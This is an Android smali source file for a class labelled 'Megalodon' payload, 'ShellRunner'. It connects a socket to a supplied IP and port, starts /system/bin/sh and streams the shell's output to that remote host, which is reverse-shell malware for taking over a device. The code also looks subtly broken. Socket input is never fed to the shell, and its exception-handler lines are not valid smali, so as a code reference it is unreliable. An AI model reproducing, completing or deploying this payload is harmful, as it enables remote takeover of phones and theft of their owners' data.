.class public Lcom/megalodon/payload/ShellRunner;
.super Ljava/lang/Object;
.implements Ljava/lang/Runnable;
.source "ShellRunner.smali"

.field private final ip:Ljava/lang/String;
.field private final port:I

.method public constructor <init>(Ljava/lang/String;I)V
    .registers 3
    iput-object p1, p0, Lcom/megalodon/payload/ShellRunner;->ip:Ljava/lang/String;
    iput p2, p0, Lcom/megalodon/payload/ShellRunner;->port:I
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
    return-void
.end method

.method public run()V
    .registers 10
    :try_start_0
    const-string v0, "Megalodon"
    new-instance v1, Ljava/lang/StringBuilder;
    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V
    const-string v2, "Connecting to "
    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    move-result-object v1
    iget-object v2, p0, Lcom/megalodon/payload/ShellRunner;->ip:Ljava/lang/String;
    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    move-result-object v1
    const-string v2, ":"
    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    move-result-object v1
    iget v2, p0, Lcom/megalodon/payload/ShellRunner;->port:I
    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
    move-result-object v1
    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object v1
    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    new-instance v0, Ljava/net/Socket;
    iget-object v1, p0, Lcom/megalodon/payload/ShellRunner;->ip:Ljava/lang/String;
    iget v2, p0, Lcom/megalodon/payload/ShellRunner;->port:I
    invoke-direct {v0, v1, v2}, Ljava/net/Socket;-><init>(Ljava/lang/String;I)V

    const-string v1, "Megalodon"
    const-string v2, "Connected!"
    invoke-static {v1, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    const-string v1, "/system/bin/sh"
    invoke-static {v1}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;
    move-result-object v2
    invoke-virtual {v2, v1}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;
    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/Process;->getInputStream()Ljava/io/InputStream;
    move-result-object v4
    invoke-virtual {v3}, Ljava/lang/Process;->getOutputStream()Ljava/io/OutputStream;
    move-result-object v5

    invoke-virtual {v0}, Ljava/net/Socket;->getInputStream()Ljava/io/InputStream;
    move-result-object v6
    invoke-virtual {v0}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;
    move-result-object v7

    const/16 v1, 0x400
    new-array v8, v1, [B
    :goto_46
    invoke-virtual {v4, v8}, Ljava/io/InputStream;->read([B)I
    move-result v1
    const/4 v2, -0x1
    if-eq v1, v2, :cond_53
    const/4 v2, 0x0
    invoke-virtual {v7, v8, v2, v1}, Ljava/io/OutputStream;->write([BII)V
    invoke-virtual {v7}, Ljava/io/OutputStream;->flush()V
    goto :goto_46
    :try_end_53
    .catch Ljava/lang/Exception; {e}
    .local e, "e":Ljava/lang/Exception;
    const-string v0, "Megalodon"
    invoke-virtual {e}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;
    move-result-object v1
    invoke-static {v0, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I
    return-void
.end method
.end class
